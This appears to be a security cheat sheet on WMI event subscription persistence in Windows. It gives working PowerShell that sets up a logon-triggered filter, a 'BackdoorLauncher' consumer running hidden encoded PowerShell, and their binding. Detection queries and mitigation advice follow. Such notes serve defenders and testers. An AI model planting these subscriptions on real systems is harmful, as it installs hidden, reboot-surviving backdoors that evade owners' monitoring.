# 🧬 WMI Event Subscription - Fileless Persistence

**WMI Event Subscription** is an elite-level persistence technique where attackers set up hidden triggers that execute payloads **in-memory**, **without touching disk**, and **without startup folders, services, or tasks**. It abuses WMI’s event system to silently respond to system changes (e.g., logon, time interval).

> ⚠️ One of the stealthiest persistence methods known. Survives reboots, fileless, and often missed by AV/EDR.

---

## 🛠️ What It Does
- Creates an **Event Filter**: defines when to trigger (e.g., on logon, at 5-minute intervals)
- Binds it to a **Consumer**: defines what to run (e.g., PowerShell payload)
- All stored in WMI’s repository — **not in file system or registry run keys**
- Survives reboot automatically

---

## 💣 Fileless Logon Persistence Example

### 1. Create a Filter
```powershell
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{ 
    Name = 'LogonTrigger'; 
    EventNamespace = 'root\cimv2'; 
    QueryLanguage = 'WQL'; 
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.UserName != NULL"
}
```
✅ Triggers when a user logs in

---

### 2. Create a Consumer
```powershell
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{ 
    Name = 'BackdoorLauncher'; 
    CommandLineTemplate = 'powershell.exe -WindowStyle Hidden -nop -enc <base64payload>'
}
```
✅ Runs a hidden PowerShell payload without touching disk

---

### 3. Bind Filter to Consumer
```powershell
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{ 
    Filter = $Filter.__PATH; 
    Consumer = $Consumer.__PATH 
}
```
✅ Now silently triggers the payload every time a user logs in

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Objects in `root\subscription` namespace | Query WMI for all `__EventFilter`, `CommandLineEventConsumer`, and bindings |
| PowerShell in `CommandLineTemplate` | Flag consumers with encoded or hidden script execution |
| Logon-triggered payloads | Investigate recurring PowerShell/cmd launches shortly after logon

Use:
```powershell
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```

---

## 🔐 Mitigation Strategies
- Monitor WMI repository changes with tools like Sysmon (Event ID 19/20/21)
- Audit WMI consumers + filters regularly (especially in `root\subscription`)
- Use EDR to correlate process launches to user logons
- Disable WMI or restrict remote access if not required

---

> 🧠 This is post-exploitation stealth at its finest. Used by APTs like FIN6, Turla, and ProjectSauron. No files, no obvious processes — just a quiet sleeper agent waiting to wake up.
